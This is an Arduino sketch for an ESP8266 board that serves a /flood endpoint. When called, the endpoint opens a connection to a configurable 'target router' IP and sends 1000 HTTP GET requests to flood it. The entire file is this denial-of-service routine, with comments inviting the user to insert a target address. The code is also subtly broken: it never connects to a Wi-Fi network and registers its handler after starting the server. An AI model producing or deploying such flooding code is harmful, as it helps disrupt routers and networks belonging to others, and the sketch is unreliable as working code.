#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>

// Set the target router's IP address
const char* targetIP = "192.168.1.1"; // Replace with the target router's IP address

ESP8266WebServer server(80);

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);

  // Start the web server
  server.begin();

  // Define the handler for the /flood request
  server.on("/flood", []() {
    floodRouter();
    server.send(200, "text/plain", "Flood test started");
  });
}

void loop() {
  server.handleClient();
}

void floodRouter() {
  // Create a socket
  WiFiClient client;

  // Connect to the target router
  if (client.connect(targetIP, 80)) {
    Serial.println("Connected to target router");

    // Send a large number of HTTP requests to flood the router
    for (int i = 0; i < 1000; i++) {
      client.println("GET / HTTP/1.1");
      client.println("Host: " + String(targetIP));
      client.println("Connection: keep-alive");
      client.println();
    }

    Serial.println("Sent HTTP requests");
  } else {
    Serial.println("Failed to connect to target router");
  }
}